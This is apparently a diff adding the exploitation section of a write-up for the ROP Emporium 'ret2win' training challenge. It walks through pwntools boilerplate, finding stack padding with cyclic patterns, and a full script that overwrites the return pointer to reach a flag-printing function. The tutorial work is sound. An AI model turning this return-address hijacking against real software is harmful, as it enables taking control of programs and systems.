@@ -78,3 +78,127 @@ By basic math we can see that 0x38 is above 0x20, and therefore we have a buffer
 Now that we are done with the reversing, let's get to the exploitation.
 
 ## Exploitation
+### Pwntools broilerplate
+
+I'll be using this boilerplate code I've made for pwntools, as my starting point for every exploit in ROPEmporium:
+```python
+from pwn import *
+
+context.arch = "amd64" #Specify x86-64 architecture
+
+context.terminal = ["konsole","-e"] #Specify that I am using Konsole terminal
+
+#Auto-executing gdbscript for every run
+gdbscript = '''
+b *main
+c
+'''
+
+binary = "./ret2win" #Binary name
+
+io = gdb.debug(binary,gdbscript=gdbscript) #Open gdb with our binary executing our gdbscript
+
+#Your
+#Code
+#Goes
+#Here
+
+
+io.interactive() #Make the binary halt for userinput
+```
+Runnning this with ```python3 exploit.py``` should open a new window with gdb attached and breaked at main.
+
+The boilerplate can also be found in this folder named boilerplate.py
+
+### Finding the padding
+
+Now that we know we can overflow, we need to find the amount of padding needed before we overflow the return pointer.
+
+We can use pwntools' cyclic function to generate a cyclic pattern of characters we can index through. Then send that to the binary:
+
+```python
+padding = cyclic(200)
+io.send(padding)
+```
+
+We can then run and stop right before we return to check what the top stack value is:
+
+![break_before_return](breakbeforereturn.png)
+
+The value the function is about to return to can be seen in the bottom half of the screen under "STACK". In this case we can see the string ```kaaalaaa```
+
+We can then use pwntools' cyclic_find to adjust our padding, so we can put in the return pointer we are interested in instead of the string ```kaaalaaa```.
+
+I'll be adding the string 'AAAA' so we can see that we now can control the return point
+
+```python
+padding = cyclic(200)[:cyclic_find('kaaalaaa')]
+io.send(padding + b'AAAA')
+```
+
+![aaaa_return](aaaa_return.png)
+
+As we can see under "STACK" the we will now try to return to the address "AAAA" or 0x41414141, we can now successfully control the return pointer
+
+### Where do we want to go?
+By looking at the different functions on the left side in Cutter I can see that we have a function called ret2win:
+
+![ret2win_function](ret2infunction.png)
+
+Disassembling it shows us that it calls 
+```C 
+system("/bin/cat flag.txt");
+```
+
+![ret2win_disassm](ret2windisassm.png)
+
+So let's copy that address ```0x00400756``` and try to return to that:
+
+```python
+padding = cyclic(200)[:cyclic_find('kaaalaaa')] #find padding
+ret2win = p64(0x400756) #ret2win function address packed to bytes so we can send it
+io.send(padding+ret2win)
+```
+
+We can now see that we will return to the ret2win function:
+
+![ret2win_success](ret2win_success.png)
+
+Pressing continue now starts loading system and we can see in our interactive shell in the other window that a flag has been printed:
+
+![flag](flag.png)
+
+Now we just need to see if it works if we replace gdb.debug with process, and we can get the flag without gdb attached!
+
+Here's the full script:
+```python
+from pwn import *
+
+context.arch = "amd64" #Specify x86-64 architecture
+
+context.terminal = ["konsole","-e"] #Specify that I am using Konsole terminal
+
+#Auto-executing gdbscript for every run
+gdbscript = '''
+b *main
+c
+'''
+
+binary = "./ret2win" #Binary name
+
+#io = gdb.debug(binary,gdbscript=gdbscript)
+io = process(binary)
+
+padding = cyclic(200)[:cyclic_find('kaaalaaa')]
+
+ret2win = p64(0x400756) #ret2win function address packed to bytes so we can send it
+
+io.send(padding+ret2win)
+
+io.interactive()
+```
+
+And this gives us the flag as well:
+```ROPE{a_placeholder_32byte_flag!}```
+
+
